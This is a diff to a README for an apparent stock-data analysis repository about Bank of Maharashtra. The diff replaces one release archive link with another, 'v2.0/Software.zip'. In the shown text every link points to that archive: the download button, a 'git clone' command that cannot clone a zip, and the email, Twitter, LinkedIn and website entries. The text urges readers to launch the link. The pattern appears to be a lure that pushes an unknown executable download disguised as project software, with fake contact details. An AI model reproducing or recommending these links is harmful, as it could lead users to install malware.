@@ -35,7 +35,7 @@ This repository covers various topics related to data analysis, data science, da
 
 To access the software related to this project, please click on the button below:
 
-[![Download Software](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip)](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip)](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to download the software. 
 
@@ -45,7 +45,7 @@ To get started with the **Stock_of_MaharashtraBank** repository, follow these st
 
 1. Clone the repository to your local machine using the following command:
    ```bash
-   git clone https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip
+   git clone https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip
    ```
 
 2. Explore the project files and directories to familiarize yourself with the structure.
@@ -75,13 +75,13 @@ Special thanks to the contributors who have worked on enhancing this project:
 
 For any questions, feedback, or collaboration opportunities, feel free to reach out to us:
 
-- Email: https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip
-- Twitter: [@stockproject](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip)
-- LinkedIn: [Stock Project](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip)
+- Email: https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip
+- Twitter: [@stockproject](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip)
+- LinkedIn: [Stock Project](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip)
 
 ## 🔗 Additional Resources
 
-For more information and updates, visit our [website](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v1.0.0/Application.zip).
+For more information and updates, visit our [website](https://github.com/test12344567676hg/Stock_of_MaharashtraBank/releases/download/v2.0/Software.zip).
 
 ---
 
